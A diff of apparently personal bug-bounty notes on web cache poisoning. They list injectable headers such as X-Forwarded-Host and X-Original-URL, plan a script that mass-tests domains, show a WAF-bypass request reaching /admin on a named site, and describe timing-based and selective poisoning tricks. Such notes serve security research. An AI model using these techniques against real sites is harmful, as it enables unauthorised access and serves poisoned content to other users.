@@ -48,6 +48,10 @@ Cache Poisoning Web Apps with HTTP Headers
 > Accept_Encoding: br.  Gareth Used this on IG, When Accept-Encoding is in the Cache Key
 > X-Forwarded-Port see https://hackerone.com/reports/409370
 > X-Forwarded-Host
+> X-Forwarded-Server
+> X-Host
+> X-Original-URL 
+> X-Rewrite-URL
 > X-Forwarded-SSL
 > Transfer-Encoding albinowax used zTRANSFER-ENCODING on bitbucket.
 > Content-Type: <invalid_value>
@@ -70,13 +74,33 @@ GET /main/static.js HTTP/1.1
 // Write ParamMiner,
 Testing Basic Web Cache Poisoning DoS
 Write a script that takes a list of domain names,
-For each domain name test a couple of request with
-the potential to cause cache poisoning and save the 
-response headers and the first 10 lines of the body
-if it exist. For each domain, create a .txt file and 
+For each domain name test a couple of requests with
+the potential to cause cache poisoning and 
+---
+save the response headers and the first 10 lines of the body if it exist. 
+---
+even better, just parse the resp and search for the injected header value
+and discard the resp if it is not found, else save the response and mark 
+the domain as vulnerable to cache poisoning 
+---
+For each domain, create a .txt file and 
 save its response. 
 
 Get one of those offline LLMs, 
+
+Bypassing WAF <PHP Frameworks>
+> GET /admin HTTP/1.1
+> Host: unity.com
+> HTTP/1.1 403 Forbidden
+> ...
+> Access is denied
+
+> GET /anything HTTP/1.1
+> Host: unity.com
+> X-­Original-­URL: /admin
+> HTTP/1.1 200 OK
+> ...
+> Please log in
 
 DEMO Script 
 `
@@ -118,3 +142,27 @@ DEMO Script
   </body>
 </html>
 `
+
+Discreet Poisoning : Timing the resource to determin exactly when a cache expires 
+to send a req to potential get a new cache
+Headers like max-age offers an insight into when the cache expires. 
+
+Selective Poisoning : HTTP Headers such as Vary tells the front-end which 
+other headers should be part of the cache key, even though some CDNs like
+cloudflare ignores the Vary header, it means a header in the Vary header
+may be part of the cache key, if this is the case, it means you can tailor
+the cache poisoning to say people using a specific version of any browser
+if the User-Agent is keyed. 
+
+The 'CF-Cache-Status' header here is an indicator that Cloudflare is considering caching this response, but in
+spite of this the response was never actually cached. I speculated that Cloudflare's refusal to cache this might be
+related to the session_id cookie, and retried with that cookie present:
+
+WHich cached did I poison?
+target.com/cdn-cgi/trace
+
+On Resp
+> Cache-­Control: max­age=0, private, must­revalidate
+> HTTP/1.1 200 OK
+Bc CF won't cache Cache-­Control: private resp, when you get this,
+you can try other pages on the site that is cacheable.
